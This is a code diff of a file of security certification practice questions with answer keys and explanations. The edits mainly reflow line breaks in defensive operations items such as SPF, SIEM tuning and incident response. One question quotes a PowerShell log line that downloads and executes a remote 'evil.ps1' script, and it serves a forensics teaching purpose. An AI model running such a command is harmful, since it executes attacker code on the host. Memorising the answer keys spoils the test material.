+    "question": "A security engineer develops a policy to block all insecure protocols on the network.\nWhich of the following ports should the security engineer block as part of that process? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -7228,7 +7190,7 @@ export const domain4Questions = [
       "B",
       "C"
     ],
-    "explanation": "Port 23 is used by Telnet, which transmits authentication credentials and session data in\nplaintext. Because it lacks encryption, it is considered insecure and should be blocked to\nprevent credential interception and session hijacking.\nPort 25 is used for SMTP message transfer and is commonly exploited for unauthenticated mail\nrelay and spam transmission. Without additional protections such as authenticated or encrypted\nmail submission services, it is considered insecure and is often blocked on internal networks to\nreduce abuse and exposure.",
+    "explanation": "Port 23 is used by Telnet, which transmits authentication credentials and session data in plaintext. Because it lacks encryption, it is considered insecure and should be blocked to prevent credential interception and session hijacking.\nPort 25 is used for SMTP message transfer and is commonly exploited for unauthenticated mail relay and spam transmission. Without additional protections such as authenticated or encrypted mail submission services, it is considered insecure and is often blocked on internal networks to reduce abuse and exposure.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7266,7 +7228,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A scan-patch-scan process reduces vulnerabilities by continuously identifying security\nweaknesses through vulnerability scanning, applying patches or remediation to address the\ndiscovered issues, and then rescanning to verify that the vulnerabilities have been properly\nresolved. This systematic cycle ensures vulnerabilities are discovered, mitigated, and validated,\nmaking it an effective operational method for reducing overall exposure.",
+    "explanation": "A scan-patch-scan process reduces vulnerabilities by continuously identifying security weaknesses through vulnerability scanning, applying patches or remediation to address the discovered issues, and then rescanning to verify that the vulnerabilities have been properly resolved. This systematic cycle ensures vulnerabilities are discovered, mitigated, and validated, making it an effective operational method for reducing overall exposure.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7304,7 +7266,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Establishing baselines allows the analyst to understand what normal system behavior looks like\nin terms of performance, traffic patterns, resource usage, and user activity. Once normal\nbehavior is documented, deviations from this baseline can be identified as abnormal or\npotentially malicious activity on the server.",
+    "explanation": "Establishing baselines allows the analyst to understand what normal system behavior looks like in terms of performance, traffic patterns, resource usage, and user activity. Once normal behavior is documented, deviations from this baseline can be identified as abnormal or potentially malicious activity on the server.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7342,7 +7304,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Rule tuning improves the accuracy of detection systems by refining alerting rules to reduce false\npositives and irrelevant alerts. By adjusting thresholds, conditions, and filtering logic, security\nteams can ensure alerts are generated only for meaningful events. This reduces the volume of\nunnecessary alerts and helps analysts focus on genuine security incidents, thereby reducing\nalert fatigue.",
+    "explanation": "Rule tuning improves the accuracy of detection systems by refining alerting rules to reduce false positives and irrelevant alerts. By adjusting thresholds, conditions, and filtering logic, security teams can ensure alerts are generated only for meaningful events. This reduces the volume of unnecessary alerts and helps analysts focus on genuine security incidents, thereby reducing alert fatigue.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7358,7 +7320,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A company wants to minimize the chance of its outgoing marketing emails getting flagged as\nspam. The company decides to list the email servers on the proper DNS record.\nWhich of the following protocols should the company apply next?",
+    "question": "A company wants to minimize the chance of its outgoing marketing emails getting flagged as spam. The company decides to list the email servers on the proper DNS record.\nWhich of the following protocols should the company apply next?",
     "choices": [
       {
         "key": "A",
@@ -7380,7 +7342,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Sender Policy Framework allows a domain owner to specify which mail servers are authorized\nto send email on behalf of the domain by publishing this information in a DNS record. Receiving\nmail servers check the sending server's IP address against the domain's SPF record to verify\nthat the email originates from an approved source. This helps prevent spoofing and reduces the\nlikelihood that legitimate emails will be flagged as spam.",
+    "explanation": "Sender Policy Framework allows a domain owner to specify which mail servers are authorized to send email on behalf of the domain by publishing this information in a DNS record. Receiving mail servers check the sending server's IP address against the domain's SPF record to verify that the email originates from an approved source. This helps prevent spoofing and reduces the likelihood that legitimate emails will be flagged as spam.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7396,7 +7358,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "An office wants to install a Wi-Fi network. The security team must ensure a secure design. The\nsecurity team expects the Wi-Fi access points to be more powerful in order to provide a better\nconnection for employees. The access points will use the latest WPA3 protocol with a 16-\ncharacter randomized key.\nWhich of the following should the security team do next?",
+    "question": "An office wants to install a Wi-Fi network. The security team must ensure a secure design. The security team expects the Wi-Fi access points to be more powerful in order to provide a better connection for employees. The access points will use the latest WPA3 protocol with a 16- character randomized key.\nWhich of the following should the security team do next?",
     "choices": [
       {
         "key": "A",
@@ -7418,7 +7380,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Creating a wireless heat map helps determine signal strength and coverage areas throughout\nthe building and around the perimeter. Since the access points will be more powerful, a heat\nmap allows the security team to verify that the wireless signal does not extend excessively\noutside the building where attackers could attempt unauthorized access. This supports secure\nplacement and power configuration of the access points to minimize signal leakage beyond\ncontrolled areas.",
+    "explanation": "Creating a wireless heat map helps determine signal strength and coverage areas throughout the building and around the perimeter. Since the access points will be more powerful, a heat map allows the security team to verify that the wireless signal does not extend excessively outside the building where attackers could attempt unauthorized access. This supports secure placement and power configuration of the access points to minimize signal leakage beyond controlled areas.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7434,7 +7396,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A SOC analyst wants to reduce the number of false positives generated in the SIEM from a\nlegitimate script.\nWhich of the following is the analyst applying?",
+    "question": "A SOC analyst wants to reduce the number of false positives generated in the SIEM from a legitimate script.\nWhich of the following is the analyst applying?",
     "choices": [
       {
         "key": "A",
@@ -7456,7 +7418,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Alert tuning involves adjusting detection rules, thresholds, or filters within a SIEM to reduce\nunnecessary or inaccurate alerts. By modifying the rules that trigger alerts for the legitimate\nscript, the analyst can prevent the SIEM from incorrectly flagging normal activity as suspicious,\nthereby reducing false positives and improving the efficiency of incident monitoring.",
+    "explanation": "Alert tuning involves adjusting detection rules, thresholds, or filters within a SIEM to reduce unnecessary or inaccurate alerts. By modifying the rules that trigger alerts for the legitimate script, the analyst can prevent the SIEM from incorrectly flagging normal activity as suspicious, thereby reducing false positives and improving the efficiency of incident monitoring.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7494,7 +7456,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Software-defined networking centralizes network control through a programmable controller,\nallowing administrators or automated systems to dynamically modify network configurations.\nThis capability enables rapid security responses such as isolating compromised devices,\nupdating access controls, or redirecting suspicious traffic when threats are detected. The\nprogrammability and automation of SDN therefore improve the network's ability to react to\nsecurity incidents in real time.",
+    "explanation": "Software-defined networking centralizes network control through a programmable controller, allowing administrators or automated systems to dynamically modify network configurations.\nThis capability enables rapid security responses such as isolating compromised devices, updating access controls, or redirecting suspicious traffic when threats are detected. The programmability and automation of SDN therefore improve the network's ability to react to security incidents in real time.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7532,7 +7494,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Incident response begins with preparation, where policies, procedures, tools, and trained\npersonnel are established to handle security incidents effectively. After preparation, the next\nsteps are detection and analysis, where potential incidents are identified, investigated, and\nvalidated to determine their scope and impact before containment and remediation activities\nbegin.",
+    "explanation": "Incident response begins with preparation, where policies, procedures, tools, and trained personnel are established to handle security incidents effectively. After preparation, the next steps are detection and analysis, where potential incidents are identified, investigated, and validated to determine their scope and impact before containment and remediation activities begin.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7570,7 +7532,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Asset enumeration involves identifying and cataloging all hardware, software, and technologies\nused within an organization's environment. This process creates an inventory of systems,\ndevices, applications, and services, providing visibility into the organization's technology assets\nand supporting security management, monitoring, and risk assessment.",
+    "explanation": "Asset enumeration involves identifying and cataloging all hardware, software, and technologies used within an organization's environment. This process creates an inventory of systems, devices, applications, and services, providing visibility into the organization's technology assets and supporting security management, monitoring, and risk assessment.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7586,7 +7548,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A security administrator needs a method to secure data in an environment that includes some\nform of checks so that the administrator can track any changes.\nWhich of the following should the administrator set up to achieve this goal?",
+    "question": "A security administrator needs a method to secure data in an environment that includes some form of checks so that the administrator can track any changes.\nWhich of the following should the administrator set up to achieve this goal?",
     "choices": [
       {
         "key": "A",
@@ -7608,7 +7570,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "File integrity monitoring tracks and verifies changes to files and system configurations by\nmonitoring file attributes such as hashes, timestamps, and permissions. It generates alerts\nwhen unauthorized or unexpected modifications occur, allowing administrators to detect and\ninvestigate changes to protected data or critical system files. This provides visibility and\naccountability for modifications within the environment.",
+    "explanation": "File integrity monitoring tracks and verifies changes to files and system configurations by monitoring file attributes such as hashes, timestamps, and permissions. It generates alerts when unauthorized or unexpected modifications occur, allowing administrators to detect and investigate changes to protected data or critical system files. This provides visibility and accountability for modifications within the environment.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7655,7 +7617,7 @@ export const domain4Questions = [
       "A",
       "D"
     ],
-    "explanation": "Sensitivity labeling classifies customer data based on its level of sensitivity, enabling the\norganization to apply appropriate security controls, handling rules, and monitoring based on the\nclassification of the data.\nLimiting access to the shared drive ensures that only authorized users who require the data for\ntheir roles can access it. Enforcing access control reduces the risk of unauthorized exposure of\ncustomer information stored on the network share.",
+    "explanation": "Sensitivity labeling classifies customer data based on its level of sensitivity, enabling the organization to apply appropriate security controls, handling rules, and monitoring based on the classification of the data.\nLimiting access to the shared drive ensures that only authorized users who require the data for their roles can access it. Enforcing access control reduces the risk of unauthorized exposure of customer information stored on the network share.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7693,7 +7655,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Access lists control which devices are permitted to connect to a network or\nenvironment by allowing or denying traffic based on identifiers such as MAC addresses, IP\naddresses, or other device attributes. By defining approved devices in the list, the organization\nensures that only authorized systems are allowed to access the environment.",
+    "explanation": "Access lists control which devices are permitted to connect to a network or environment by allowing or denying traffic based on identifiers such as MAC addresses, IP addresses, or other device attributes. By defining approved devices in the list, the organization ensures that only authorized systems are allowed to access the environment.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7709,7 +7671,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "Which of the following is a key reason to follow data retention policies during asset\ndecommissioning?",
+    "question": "Which of the following is a key reason to follow data retention policies during asset decommissioning?",
     "choices": [
       {
         "key": "A",
@@ -7731,7 +7693,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Data retention policies define how long data should be kept and when it must be securely\ndestroyed. Following these policies during asset decommissioning ensures sensitive information\nis not retained longer than necessary and is properly eliminated to prevent unauthorized access.",
+    "explanation": "Data retention policies define how long data should be kept and when it must be securely destroyed. Following these policies during asset decommissioning ensures sensitive information is not retained longer than necessary and is properly eliminated to prevent unauthorized access.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7747,7 +7709,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst reviews the following endpoint log:\npowershell -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString\n(http://176.30.40.50/evil.ps1\")\nWhich of the following logs will help confirm an established connection to IP 176.30 40.50?",
+    "question": "A security analyst reviews the following endpoint log:\npowershell -exec bypass -Command \"IEX (New-Object Net.WebClient).DownloadString (http://176.30.40.50/evil.ps1\") Which of the following logs will help confirm an established connection to IP 176.30 40.50?",
     "choices": [
       {
         "key": "A",
@@ -7769,7 +7731,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Firewall logs record network traffic flows, including outbound connections from a host to external\nIP addresses, which can confirm whether a connection to the specified IP was established.",
+    "explanation": "Firewall logs record network traffic flows, including outbound connections from a host to external IP addresses, which can confirm whether a connection to the specified IP was established.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7807,7 +7769,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "SCAP standardizes how vulnerability and configuration data is formatted and shared, allowing\ndifferent security tools to interoperate and exchange information consistently across vendors.",
+    "explanation": "SCAP standardizes how vulnerability and configuration data is formatted and shared, allowing different security tools to interoperate and exchange information consistently across vendors.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7823,7 +7785,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "The Chief Information Security Officer gives the security community the opportunity to report\nvulnerabilities on the organization's public-facing assets.\nWhich of the following does this scenario best describe?",
+    "question": "The Chief Information Security Officer gives the security community the opportunity to report vulnerabilities on the organization's public-facing assets.\nWhich of the following does this scenario best describe?",
     "choices": [
       {
         "key": "A",
@@ -7845,7 +7807,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A bug bounty program invites external security researchers to identify and report vulnerabilities\nin an organization's systems, often in exchange for rewards, improving overall security.",
+    "explanation": "A bug bounty program invites external security researchers to identify and report vulnerabilities in an organization's systems, often in exchange for rewards, improving overall security.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7883,7 +7845,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "OSINT involves gathering information from publicly available sources such as websites, social\nmedia, and public records to identify potential security exposures and threats.",
+    "explanation": "OSINT involves gathering information from publicly available sources such as websites, social media, and public records to identify potential security exposures and threats.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7921,7 +7883,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A sandboxing environment allows the analyst to safely access and recover files from the USB\ndrive in an isolated environment, preventing potential malware from affecting production\nsystems.",
+    "explanation": "A sandboxing environment allows the analyst to safely access and recover files from the USB drive in an isolated environment, preventing potential malware from affecting production systems.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7959,7 +7921,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Enforcing 802.1X with device certificates ensures only authenticated devices can connect, and\nendpoint security checks verify compliance with security policies before granting network\naccess, effectively mitigating unauthorized device risks.",
+    "explanation": "Enforcing 802.1X with device certificates ensures only authenticated devices can connect, and endpoint security checks verify compliance with security policies before granting network access, effectively mitigating unauthorized device risks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -7975,7 +7937,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "Alerts from email protection systems and MSSPs must be entered into an IT service\nmanagement system and assigned to the security team.\nWhich of the following should an organization implement to enable this functionality?",
+    "question": "Alerts from email protection systems and MSSPs must be entered into an IT service management system and assigned to the security team.\nWhich of the following should an organization implement to enable this functionality?",
     "choices": [
       {
         "key": "A",
@@ -7997,7 +7959,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Automated ticket creation integrates alerts from security tools into an IT service management\nsystem, ensuring incidents are logged and assigned to the appropriate security team for\nresponse.",
+    "explanation": "Automated ticket creation integrates alerts from security tools into an IT service management system, ensuring incidents are logged and assigned to the appropriate security team for response.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8013,7 +7975,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A software development team tests a new feature that processes user-uploaded files. A security\nengineer is concerned that attackers might upload malicious files to exploit vulnerabilities after\nthe application moves to production.\nWhich of the following approaches will best reduce this risk?",
+    "question": "A software development team tests a new feature that processes user-uploaded files. A security engineer is concerned that attackers might upload malicious files to exploit vulnerabilities after the application moves to production.\nWhich of the following approaches will best reduce this risk?",
     "choices": [
       {
         "key": "A",
@@ -8035,7 +7997,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Processing user-uploaded files in an isolated environment such as a sandbox limits access to\nsystem resources, preventing malicious files from impacting the main system even if they exploit\nvulnerabilities.",
+    "explanation": "Processing user-uploaded files in an isolated environment such as a sandbox limits access to system resources, preventing malicious files from impacting the main system even if they exploit vulnerabilities.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8051,7 +8013,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following best describes the practice of preserving and documenting the handling\nof forensic evidence?",
+    "question": "Which of the following best describes the practice of preserving and documenting the handling of forensic evidence?",
     "choices": [
       {
         "key": "A",
@@ -8073,7 +8035,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Chain of custody ensures that forensic evidence is properly documented, tracked, and handled\nfrom collection through analysis to maintain its integrity and admissibility.",
+    "explanation": "Chain of custody ensures that forensic evidence is properly documented, tracked, and handled from collection through analysis to maintain its integrity and admissibility.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8111,7 +8073,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Compression reduces the storage size of logs, allowing more data to remain in fast, accessible\nlive storage for a longer period, which supports quicker search performance.",
+    "explanation": "Compression reduces the storage size of logs, allowing more data to remain in fast, accessible live storage for a longer period, which supports quicker search performance.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8127,7 +8089,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst Investigates an incident in which a PowerShell script was identified as a\npotential IoC. Which of the following will best help the analyst identify an attempt to compromise\nthe system?",
+    "question": "A security analyst Investigates an incident in which a PowerShell script was identified as a potential IoC. Which of the following will best help the analyst identify an attempt to compromise the system?",
     "choices": [
       {
         "key": "A",
@@ -8149,7 +8111,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "EDR logs provide detailed visibility into endpoint activity, including process execution, script\nbehavior, and command-line actions, making them most effective for identifying malicious\nPowerShell activity and potential system compromise.",
+    "explanation": "EDR logs provide detailed visibility into endpoint activity, including process execution, script behavior, and command-line actions, making them most effective for identifying malicious PowerShell activity and potential system compromise.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8187,7 +8149,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Immutability ensures backups cannot be altered or encrypted after creation, preventing\nransomware from infecting them and preserving clean recovery points.",
+    "explanation": "Immutability ensures backups cannot be altered or encrypted after creation, preventing ransomware from infecting them and preserving clean recovery points.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8203,7 +8165,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "An application security engineer is working to address issues stemming from situations where\nnecessary approvals and testing were not done before code was committed directly into the\nproduction codebase.\nWhich of the following would be the most appropriate for the engineer to require?",
+    "question": "An application security engineer is working to address issues stemming from situations where necessary approvals and testing were not done before code was committed directly into the production codebase.\nWhich of the following would be the most appropriate for the engineer to require?",
     "choices": [
       {
         "key": "A",
@@ -8225,7 +8187,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Branch protection enforces controls such as required approvals, code reviews, and testing\nbefore changes can be merged into the production branch, preventing direct, unreviewed\ncommits.",
+    "explanation": "Branch protection enforces controls such as required approvals, code reviews, and testing before changes can be merged into the production branch, preventing direct, unreviewed commits.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8263,7 +8225,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "An effective asset tracking system provides visibility into all authorized devices, making it easier\nto detect unknown or unmanaged devices that could pose security risks.",
+    "explanation": "An effective asset tracking system provides visibility into all authorized devices, making it easier to detect unknown or unmanaged devices that could pose security risks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8301,7 +8263,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "A false negative occurs when a scan fails to detect an existing vulnerability, resulting in a report\nthat incorrectly indicates no vulnerabilities are present.",
+    "explanation": "A false negative occurs when a scan fails to detect an existing vulnerability, resulting in a report that incorrectly indicates no vulnerabilities are present.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8317,7 +8279,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "Which of the following best explains a reason for automating and orchestrating the service ticket\nprocess?",
+    "question": "Which of the following best explains a reason for automating and orchestrating the service ticket process?",
     "choices": [
       {
         "key": "A",
@@ -8339,7 +8301,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Automation and orchestration reduce manual intervention, ensuring consistent, faster, and less\nerror-prone handling of service tickets by minimizing the impact of human involvement.",
+    "explanation": "Automation and orchestration reduce manual intervention, ensuring consistent, faster, and less error-prone handling of service tickets by minimizing the impact of human involvement.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8355,7 +8317,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A security administrator wants to increase a company's technical defenses after two users\nexperienced payroll fraud due to phishing attacks.\nWhich of the following should the administrator do?",
+    "question": "A security administrator wants to increase a company's technical defenses after two users experienced payroll fraud due to phishing attacks.\nWhich of the following should the administrator do?",
     "choices": [
       {
         "key": "A",
@@ -8377,7 +8339,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Strengthening email security controls directly addresses phishing threats by\nfiltering and blocking malicious or suspicious emails before they reach users, reducing the\nlikelihood of credential compromise and fraud.",
+    "explanation": "Strengthening email security controls directly addresses phishing threats by filtering and blocking malicious or suspicious emails before they reach users, reducing the likelihood of credential compromise and fraud.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8393,7 +8355,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A company uses multiple providers to send its marketing, internal, and support emails. Many of\nthe emails are marked as spam.\nWhich of the following changes should the company make to ensure legitimate emails are\nvalidated?",
+    "question": "A company uses multiple providers to send its marketing, internal, and support emails. Many of the emails are marked as spam.\nWhich of the following changes should the company make to ensure legitimate emails are validated?",
     "choices": [
       {
         "key": "A",
@@ -8415,7 +8377,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Updating the SPF record to include all authorized email-sending providers ensures receiving\nservers can verify legitimate sources, reducing the likelihood of emails being marked as spam.",
+    "explanation": "Updating the SPF record to include all authorized email-sending providers ensures receiving servers can verify legitimate sources, reducing the likelihood of emails being marked as spam.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8431,7 +8393,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "Which of the following is a SIEM system using when monitoring Unix servers with only an SSH\ncredentials login?",
+    "question": "Which of the following is a SIEM system using when monitoring Unix servers with only an SSH credentials login?",
     "choices": [
       {
         "key": "A",
@@ -8453,7 +8415,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Agentless monitoring uses existing protocols like SSH to access systems without installing local\nagents, which fits a setup where only SSH credentials are used.",
+    "explanation": "Agentless monitoring uses existing protocols like SSH to access systems without installing local agents, which fits a setup where only SSH credentials are used.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8469,7 +8431,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "multi",
-    "question": "Hacktivists change an organization's page. The page's content is limited to static code and\nimages.\nWhich of the following should the organization use to detect and prevent modifications on the\npage? (Choose two.)",
+    "question": "Hacktivists change an organization's page. The page's content is limited to static code and images.\nWhich of the following should the organization use to detect and prevent modifications on the page? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -8500,7 +8462,7 @@ export const domain4Questions = [
       "D",
       "E"
     ],
-    "explanation": "File integrity monitoring detects unauthorized changes to static files by comparing them against\nknown baselines. A web application firewall helps prevent unauthorized modifications by filtering\nand blocking malicious requests targeting the web server.",
+    "explanation": "File integrity monitoring detects unauthorized changes to static files by comparing them against known baselines. A web application firewall helps prevent unauthorized modifications by filtering and blocking malicious requests targeting the web server.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8516,7 +8478,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "An organization wants to ensure the integrity of compiled binaries in the production\nenvironment.\nWhich of the following security measures would best support this objective?",
+    "question": "An organization wants to ensure the integrity of compiled binaries in the production environment.\nWhich of the following security measures would best support this objective?",
     "choices": [
       {
         "key": "A",
@@ -8538,7 +8500,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Code signing verifies that compiled binaries come from a trusted source and have not been\naltered after signing. This directly supports integrity by allowing production systems to detect\ntampered or unauthorized binaries before execution.",
+    "explanation": "Code signing verifies that compiled binaries come from a trusted source and have not been altered after signing. This directly supports integrity by allowing production systems to detect tampered or unauthorized binaries before execution.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8554,7 +8516,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst investigates an incident involving exfiltration of several large files with\nsensitive data.\nWhich of the following data sources is best to identify the activity?",
+    "question": "A security analyst investigates an incident involving exfiltration of several large files with sensitive data.\nWhich of the following data sources is best to identify the activity?",
     "choices": [
       {
         "key": "A",
@@ -8576,7 +8538,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "NetFlow logs show network traffic patterns, including source, destination, volume, and timing.\nSorting by destination IP helps identify where large outbound transfers were sent, making it the\nbest source for investigating data exfiltration.",
+    "explanation": "NetFlow logs show network traffic patterns, including source, destination, volume, and timing.\nSorting by destination IP helps identify where large outbound transfers were sent, making it the best source for investigating data exfiltration.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8592,7 +8554,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "An organization has an external developer create all of its critical software that serves various\ncustomers.\nWhich of the following is a key concern for the organization?",
+    "question": "An organization has an external developer create all of its critical software that serves various customers.\nWhich of the following is a key concern for the organization?",
     "choices": [
       {
         "key": "A",
@@ -8614,7 +8576,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Vendor lock-in is a key concern when an organization depends on an external developer for\ncritical software. This can make it difficult to change providers, maintain control over future\ndevelopment, or migrate the software without significant cost or disruption.",
+    "explanation": "Vendor lock-in is a key concern when an organization depends on an external developer for critical software. This can make it difficult to change providers, maintain control over future development, or migrate the software without significant cost or disruption.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8630,7 +8592,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Scans of new servers created from a community image show an abnormally high number of\nvulnerabilities.\nWhich of the following steps was most likely missed when deploying these systems?",
+    "question": "Scans of new servers created from a community image show an abnormally high number of vulnerabilities.\nWhich of the following steps was most likely missed when deploying these systems?",
     "choices": [
       {
         "key": "A",
@@ -8652,7 +8614,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Removing unnecessary software is a key hardening step. Community images often include\nextra packages, services, and outdated components that increase the attack surface and create\nmany vulnerability findings.",
+    "explanation": "Removing unnecessary software is a key hardening step. Community images often include extra packages, services, and outdated components that increase the attack surface and create many vulnerability findings.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -8668,7 +8630,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "multi",
